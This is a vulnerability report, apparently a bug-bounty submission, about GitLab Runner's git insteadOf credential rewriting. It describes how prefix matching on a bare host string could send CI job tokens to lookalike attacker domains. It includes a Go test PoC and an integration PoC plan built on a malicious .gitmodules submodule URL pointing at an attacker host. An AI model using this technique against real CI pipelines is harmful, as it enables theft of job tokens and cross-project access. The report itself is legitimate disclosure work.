### Title
Host-scoped `insteadOf` credential rewrite is vulnerable to literal string-prefix ("domain-suffix") confusion, allowing job-token disclosure to attacker-controlled hosts - (File: helpers/url/gitauth.go, functions/concrete/run/stages/get_sources.go, shells/abstract.go)

### Summary
`GitAuthHelper.GetInsteadOfs`/`repoBaseInsteadOf` in `helpers/url/gitauth.go` build `git config url.<withCreds>.insteadOf <withoutCreds>` rules using the bare scheme+host string (e.g. `https://gitlab.example.com`) with no trailing boundary character. `git`'s `insteadOf` matching is a literal string-prefix match, not a host-aware match, so any submodule/nested-fetch URL that merely starts with that literal string (e.g. `https://gitlab.example.com.attacker.tld/x.git`) is rewritten to prepend the job-token credentials, causing the CI_JOB_TOKEN to be sent to an attacker-controlled host.

### Finding Description
`repoBaseInsteadOf` deliberately scopes credential injection to "the RepoURL base (without the project path) so that submodules referencing other projects on the same host can be rewritten with credentials" [1](#0-0) . The base is constructed by stripping the path (`base.Path = ""`) and stringified via `trimmed()`, which is just `strings.TrimRight(u.String(), "/")` [2](#0-1) . For a host with an empty path, `url.URL.String()` produces exactly `https://gitlab.example.com` — no trailing slash, no other boundary character. This value becomes the "insteadOf" value in `git config url.<withCreds>.insteadOf <withoutCreds>` (`GetInsteadOfs`, `applyAuth`) [3](#0-2)  and [4](#0-3) .

This is then written verbatim into the per-job external git config used during clone/fetch and submodule operations, e.g. `setupExternalGitConfig` in `shells/abstract.go` (`w.CommandArgExpand("git", "config", "--file", extConfigFile, "--replace-all", replaceStanza, orgURL, pattern)`) [5](#0-4) , and the concrete-runner equivalent `setupExternalGitConfig` in `functions/concrete/run/stages/get_sources.go` [6](#0-5) . This external config is then explicitly `include.path`-ed into every submodule during `git submodule update`/`foreach`, both in the abstract-shell path (`withExplicitSubmoduleCreds`) [7](#0-6)  and the concrete-runner path (`doSubmoduleUpdate`) [8](#0-7) .

`git`'s `url.<base>.insteadOf` rewrite mechanism performs a literal-string prefix match/substitution on the fetch URL — it is not host- or DNS-boundary-aware. A submodule URL such as `https://gitlab.example.com.attacker.tld/x.git` textually begins with the literal string `https://gitlab.example.com`, so git substitutes that prefix with the credentialed base (`https://gitlab-ci-token:<CI_JOB_TOKEN>@gitlab.example.com`), producing the rewritten fetch target `https://gitlab-ci-token:<TOKEN>@gitlab.example.com.attacker.tld/x.git`. This URL resolves via DNS to the attacker's subdomain (which they fully control by registering `attacker.tld` and adding the subdomain), and the job token is sent to that attacker-controlled server in the HTTP Basic-Auth header.

Attacker path: an unprivileged pipeline author (e.g. contributing a `.gitmodules` entry or MR branch, or controlling `GIT_SUBMODULE_FORCE_HTTPS`/submodule refs) sets a submodule/nested-fetch URL to a domain that shares the GitLab host as a literal string prefix. No existing check validates that the matched value corresponds to an actual host boundary (`/` or end-of-string) before it is installed as an `insteadOf` value — `deduplicateInsteadOfs` only removes exact duplicates [9](#0-8) , and no code path appends a boundary character (e.g., trailing `/`) to the base string used for `insteadOf` matching, unlike the SSH rewrite rules where a trailing `/` is explicitly added in some branches (`baseURL + "/"`) [10](#0-9)  — that protection is absent from the primary HTTPS `insteadOf` entry.

### Impact Explanation
Concrete token disclosure: the `CI_JOB_TOKEN` (scoped credential with access to the triggering project and any projects allow-listed via job-token scope) is transmitted over the network to a domain fully controlled by the attacker, who can log and reuse it against the GitLab API/registry for as long as the token remains valid (job duration). This matches the requested Immunefi impact category "token disclosure or cross-project unauthorized access."

### Likelihood Explanation
The precondition is simply the ability to influence a submodule/nested fetch URL processed by the job (e.g. via `.gitmodules` in a forked/branch pipeline, or a nested `git submodule` remote), which any pipeline author who can open a merge request or push a branch can do. No admin privilege, no leaked keys, and no separate service compromise is required — it purely depends on attacker-registered DNS (a domain they own) and the runner's existing insteadOf host-scoping logic. It is deterministically reproducible.

### Recommendation
Anchor the `insteadOf` value to an explicit host boundary rather than a bare prefix: append a `/` (or use `url.<base>.insteadOf` with pattern that only matches `scheme://host` immediately followed by `/` or end-of-string) when constructing the base string in `helpers/url/gitauth.go`'s `GetInsteadOfs`/`repoBaseInsteadOf`/`trimmed`, or validate the resulting submodule/nested URL host via parsed `net/url` comparison (`u.Host == expectedHost`) before applying credentials, instead of relying on git's literal prefix-based `insteadOf` matching.

### Proof of Concept
Go unit test in `helpers/url` (extending `TestGetInsteadOfs`):
```go
func TestGetInsteadOfs_DomainSuffixConfusion(t *testing.T) {
    cfg := GitAuthConfig{
        RepoURL: "https://gitlab.example.com/group/project.git",
        Token:   "abc123",
    }
    h := NewGitAuthHelper(cfg, true)
    ios, err := h.GetInsteadOfs()
    require.NoError(t, err)

    // Confirm the insteadOf "value" (io[1]) has no trailing boundary character.
    for _, io := range ios {
        assert.NotEqual(t, "https://gitlab.example.com", io[1],
            "insteadOf pattern lacks a host boundary and will match attacker domains like https://gitlab.example.com.evil.com")
    }
}
```
Integration-level PoC: create a repo whose `.gitmodules` submodule URL is `https://gitlab.example.com.attacker-controlled.tld/x.git`, resolve that subdomain to an attacker-controlled HTTP server, run `git -c include.path=<generated ext conf> submodule update --init`, and assert the attacker server receives an `Authorization: Basic <base64 of gitlab-ci-token:TOKEN>` header — demonstrating credential exfiltration to a non-GitLab host.

### Citations

**File:** helpers/url/gitauth.go (L88-112)
```go
	if !h.authenticated {
		return h.sshInsteadOfs(trimmed(baseURL)), nil
	}

	authedBase, err := h.applyAuth(baseURL)
	if err != nil {
		return nil, err
	}

	// https://example.com/ -> https://gitlab-ci-token:abc123@example.com/
	insteadOfs := [][2]string{
		{trimmed(authedBase), trimmed(baseURL)},
	}
	insteadOfs = append(insteadOfs, h.sshInsteadOfs(trimmed(authedBase))...)

	entry, err := h.repoBaseInsteadOf()
	if err != nil {
		return nil, err
	}
	if entry != nil {
		insteadOfs = append(insteadOfs, *entry)
	}

	return insteadOfs, nil
}
```

**File:** helpers/url/gitauth.go (L114-135)
```go
// repoBaseInsteadOf returns an insteadOf entry for the RepoURL base (without the project path) so
// that submodules referencing other projects on the same host can be rewritten with credentials.
// The RepoURL may differ from CloneURL since it comes from the API rather than runner config.
// See: https://gitlab.com/gitlab-org/gitlab-runner/-/issues/39170
func (h *GitAuthHelper) repoBaseInsteadOf() (*[2]string, error) {
	repoURL, err := url.Parse(h.config.RepoURL)
	if err != nil || !isHTTP(repoURL) {
		return nil, err
	}

	base := *repoURL
	base.Path = ""

	authed, err := h.applyAuth(&base)
	if err != nil {
		return nil, err
	}

	base.User = nil

	return &[2]string{trimmed(authed), trimmed(&base)}, nil
}
```

**File:** helpers/url/gitauth.go (L137-158)
```go
// applyAuth sets userinfo appropriate for the current mode: job token credentials when
// authenticated, nil when unauthenticated. SSH URLs always default to the "git" user.
func (h *GitAuthHelper) applyAuth(u *url.URL) (*url.URL, error) {
	if u == nil {
		return nil, fmt.Errorf("invalid URL")
	}

	c := *u

	switch {
	case c.Scheme == "ssh":
		if c.User == nil {
			c.User = url.User("git")
		}
	case h.authenticated:
		c.User = url.UserPassword("gitlab-ci-token", h.config.Token)
	default:
		c.User = nil
	}

	return &c, nil
}
```

**File:** helpers/url/gitauth.go (L170-176)
```go
	if port == "" || port == "22" {
		return [][2]string{
			{baseURL + "/", fmt.Sprintf("git@%s:", host)},
			{baseURL, fmt.Sprintf("ssh://git@%s", host)},
		}
	}

```

**File:** helpers/url/gitauth.go (L194-196)
```go
func trimmed(u *url.URL) string {
	return strings.TrimRight(u.String(), "/")
}
```

**File:** shells/abstract.go (L805-817)
```go
// deduplicateInsteadOfs removes duplicate insteadOf entries, keeping the first occurrence.
// This prevents redundant git config rules when the same URL rewrite appears multiple times.
func deduplicateInsteadOfs(insteadOfs [][2]string) [][2]string {
	seen := make(map[[2]string]bool)
	result := make([][2]string, 0, len(insteadOfs))
	for _, io := range insteadOfs {
		if !seen[io] {
			seen[io] = true
			result = append(result, io)
		}
	}
	return result
}
```

**File:** shells/abstract.go (L862-870)
```go
	// De-duplicate insteadOfs entries to avoid redundant git config rules
	insteadOfs = deduplicateInsteadOfs(insteadOfs)

	for _, io := range insteadOfs {
		replaceStanza := "url." + io[0] + ".insteadOf"
		orgURL := io[1]
		pattern := "^" + regexp.QuoteMeta(orgURL) + "$"
		w.CommandArgExpand("git", "config", "--file", extConfigFile, "--replace-all", replaceStanza, orgURL, pattern)
	}
```

**File:** shells/abstract.go (L1262-1272)
```go
	// Some submodule operations need creds configured, but don't pick up config from the main repo. For those, we
	// explicitly "include.path" the externalized git config. For the "include.path" value, we use an env var, thus we
	// need to ensure that those commands run with arg expansion.
	withExplicitSubmoduleCreds := func(orgArgs []string) []string {
		return slices.Concat(
			[]string{"-c", "include.path=" + w.EnvVariableKey(envVarExternalGitConfigFile)},
			orgArgs,
		)
	}

	w.IfCmdWithOutputArgExpand("git", withExplicitSubmoduleCreds(updateArgs)...)
```

**File:** functions/concrete/run/stages/get_sources.go (L462-475)
```go
	insteadOfs := make([][2]string, 0, 1+len(s.InsteadOfs))
	if withCreds != withoutCreds {
		insteadOfs = append(insteadOfs, [2]string{withCreds, withoutCreds})
	}
	insteadOfs = append(insteadOfs, s.InsteadOfs...)
	insteadOfs = deduplicateInsteadOfs(insteadOfs)

	for _, io := range insteadOfs {
		stanza := "url." + io[0] + ".insteadOf"
		pattern := "^" + regexp.QuoteMeta(io[1]) + "$"
		if err := setConfigAll(stanza, io[1], pattern, "insteadOf for "+io[1]); err != nil {
			return "", cleanup, err
		}
	}
```

**File:** functions/concrete/run/stages/get_sources.go (L766-782)
```go

	absExtConfig, _ := filepath.Abs(extConfigFile)
	withCreds := func(args []string) []string {
		return append([]string{"-c", "include.path=" + absExtConfig}, args...)
	}

	updateArgs := []string{"submodule", "update", "--init"}
	if recursive {
		updateArgs = append(updateArgs, "--recursive")
	}
	if s.SubmoduleDepth > 0 {
		updateArgs = append(updateArgs, "--depth", strconv.Itoa(s.SubmoduleDepth))
	}
	updateArgs = append(updateArgs, s.SubmoduleUpdateFlags...)
	updateArgs = append(updateArgs, s.submodulePathArgs()...)

	if err := git(ctx, e, extraEnv, withCreds(updateArgs)...); err != nil {
```
